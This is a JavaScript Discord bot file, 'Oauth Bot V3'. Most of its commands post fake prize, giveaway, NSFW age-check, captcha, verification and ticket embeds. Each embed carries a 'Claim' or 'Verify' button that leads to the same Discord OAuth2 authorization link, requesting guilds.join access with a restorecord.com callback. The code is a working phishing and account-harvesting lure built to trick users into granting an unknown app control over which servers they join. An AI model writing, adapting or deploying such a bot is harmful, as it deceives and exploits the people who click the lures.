const { Collection, Client, Discord, MessageEmbed, Message, Intents } = require('discord.js');
const moment = require("moment")
require("moment-duration-format")
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
require('discord-buttons')(client);
const path = require('path')
const fs = require('fs')
let cpuStat = require("cpu-stat");
const discordbuttons = require('discord-buttons')
let os = require("os");
const { MessageButton, MessageActionRow, URL, ButtonBuilder, Link} = require("discord-buttons")
const keepAlive = require("./server");
client.prefix = "+"




    const activities = [
      "...",
      "+help | v3",
    ];

    client.on("ready", () => {
      // run every 10 seconds
      setInterval(() => {
        // generate random number between 1 and list length.
        const randomIndex = Math.floor(Math.random() * (activities.length - 1) + 1);
        const newActivity = activities[randomIndex];

        client.user.setActivity(newActivity);
      }, 20000);
    });




client.on('message', async (message) => {
    if (message.content.startsWith('+help')) {
        const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(`**Oauth Bot V3**`)

        .setDescription (`🍁 ** Commandes:**\n \`help\` \`stats\` \`renew\`\n\n✨ ** Commandes du bot:**\n \`nsfw\` \`gift\` \`nitro1\` \`nitro2\` \`roblox\` \`verify\` \`giveaway\` \`boost\` \`captcha\` \`ticket\` \`event\``)
        message.channel.send({embed: embed })
    }
})




client.on('message', async (message) => {
    if (message.content.startsWith('+stats')) {
      cpuStat.usagePercent(function (e, percent, seconds) {
          if (e) {
              return console.log(String(e.stack).red);
          }
          const duration = moment.duration(client.uptime).format(" D [days], H [hrs], m [mins], s [secs]");

          let connectedchannelsamount = 0;
          let guilds = client.guilds.cache.map((guild) => guild);
          for (let i = 0; i < guilds.length; i++) {
              if (guilds[i].me.voice.channel) connectedchannelsamount += 1;
          }
        const embed = new MessageEmbed()
        .setColor("0")
        .setTitle(`**Stats:**`)

              .addField("⏳ Memory Usage", `\`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}/ ${(os.totalmem() / 1024 / 1024).toFixed(2)}MB\``, false)
              .addField("⌚️ Uptime ", `\`${duration}\``, false)
              .addField("📁 Users", `\`${client.users.cache.size}\``, false)
              .addField("🚀 Servers", `\`${client.guilds.cache.size}\``, false)
             .addField("⏰ API Latency", `\`${client.ws.ping}ms\``, false)
              .addField("🤖 CPU usage", `\`${percent.toFixed(2)}%\``, false)
              .setFooter("Coded by: Felosi");
        message.channel.send({embed: embed })
    }
   )}
})

client.on('message', async (message) => {
  if (message.content.startsWith('+renew')) {
      if (!message.member.hasPermission("MANAGE_CHANNELS")) {
          return message.channel.send("You don't have permissions to do this command!")

      }
      message.channel.clone().then
      ((ch) => {
          ch.setParent(message.channel.parent);
          ch.setPosition(message.channel.position);
          message.channel.delete().then(() => {
              ch.send("**Channel Nuked** \n https://imgur.com/LIyGeCR")
          })

      });
}
}
)


//----------------GRAB------------------



client.on('message', async (message) => {
    if (message.content.startsWith('+event')) {
        const embed = new MessageEmbed()
        .setColor("0")
        .setTitle(`__**🎁 Prizes**__`)

        .setDescription (`・ Instant Claim ⚡️

・ 2 Invite = Nitro Boost Monthly / 2000 robux

・ 3 Invite = Nitro Basic Yearly / 3000 robux

・4 Invite = Nitro Boost Yearly / 4000 Robux


🎊 Are you out of invitations? Verify your invites in ⁠the invites channel and DM the Owner to claim your reward. `)
        .setImage("https://www.centralxbox.com.br/wp-content/uploads/2019/11/discord-nitro.jpg")
        message.channel.send({embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+nsfw')) {
        const embed = new MessageEmbed()
        .setTitle(`NSFW Verification`)
        .setDescription(`Click the emoji to confirm that you are 18 or older and consent to view sexual content.`)
.setImage('https://cdn.discordapp.com/attachments/945812190936584233/1089594308543393792/JqoLqSb_1.gif')
        .setColor("0")

        const z = new MessageButton()
            .setStyle("url")
            .setLabel("🔞")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
        const row = new MessageActionRow()
            .addComponent([z])

        message.channel.send({ component: row, embed: embed })
    }
})
  
client.on('message', async (message) => {
    if (message.content.startsWith('+nitro1')) {
        const embed = new MessageEmbed()
        .setDescription(`**You won a nitro classic click claim button to get!**`)
.setImage('https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Claim")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+nitro2')) {
        const embed = new MessageEmbed()
        .setDescription(`**You won a nitro boost click claim button to get!**`)
.setImage('https://media.discordapp.net/attachments/1160257350305841282/1167579455129129000/11111unknown.png?ex=654ea41a&is=653c2f1a&hm=d6b7298ea911675c2a252913f932e0fd6cfb1eed9938cd2ea734f30cbdac9e77&=')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Claim")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on("message", async (message) => {
  //if (message.author.bot) return;
  if (message.content.startsWith("+gift")) {
    let button = new MessageButton()
    .setStyle('url')
    .setURL('https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802')
    .setLabel('Claim');
    message.channel.send('https://media.discordapp.net/attachments/1160257350305841282/1167579464511782963/55PTtjKxcf5X2uHi7deJcQ.png?ex=654ea41c&is=653c2f1c&hm=67af30e51aa927ec41039b51297e71b5f43f79a371d7e938732f9679b0434a6d&=',button)
  }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+boost')) {
        const embed = new MessageEmbed()
        .setTitle("Hello everyone, you have all received a Nitro Discord for one year!")
        .setDescription(`To get your Nitro Boost, all you need to do is:
   \n1️⃣ Click on the button [claim](https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802).
   \n2️⃣ Click on the button [autorize](https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802).\n\nOnce you get autorized you need to wait about 24-48 hours and you will get it.`)
.setImage('https://i.ibb.co/54xmJfm/Capture-decran-le-2022-12-30-a-15-58-02.png')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("🎁 Claim")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})


client.on('message', async (message) => {
    if (message.content.startsWith('+giveaway')) {
        const embed = new MessageEmbed()
        .setTitle("**Nitro Boost 1 month 🎁** ")
        .setDescription(`\nWinners: \`1\`\nTimer: \`Ends in 2 hours\`\nHosted by: \`~ Nassoxx\` \n\n\n\n:tada: To enter the giveaway, click on the button below.`)
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("🎉 Enter")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+roblox')) {
        const embed = new MessageEmbed()
        .setTitle("**You won a $10 Roblox gift card click claim button to get!**")
.setImage('https://scratchmonkeys.com/image/cache/catalog/Product%20Images/Roblox/USD/roblox-gift-card-10-300x190.webp')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Claim")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+verify')) {
        const embed = new MessageEmbed()
        .setTitle("Verification")
        .setDescription(`**Please click on the button to access the server!**`)
.setImage('https://upload.wikimedia.org/wikipedia/fr/9/9d/Captcha_google_checkbox.gif')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Verify here")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+captcha')) {
        const embed = new MessageEmbed()
        .setTitle("**ℹ️ Welcome to [+] Protect!**")
        .setDescription(`In order to access the entire server, please click on the button and answer what you read in the image below (to verify that you are not a robot).`)
.setFooter("⚠️ The code consists of 5 letters/numbers.")
.setImage('https://www.learningsuccessblog.com/files/0aainput-black.gif')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Respond")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+ticket')) {
        const embed = new MessageEmbed()
        .setTitle("Support")
        .setDescription(`To create a ticket react with 📩`)
.setFooter("[+] Protect - Ticketing without clutter")
.setImage('https://www.toulokowitz.fr/wp-content/uploads/2020/06/29966-1280x483.jpg')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("📩 Create ticket")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

keepAlive();
client.login(process.env.TOKEN);

//Made by Felosi @2023
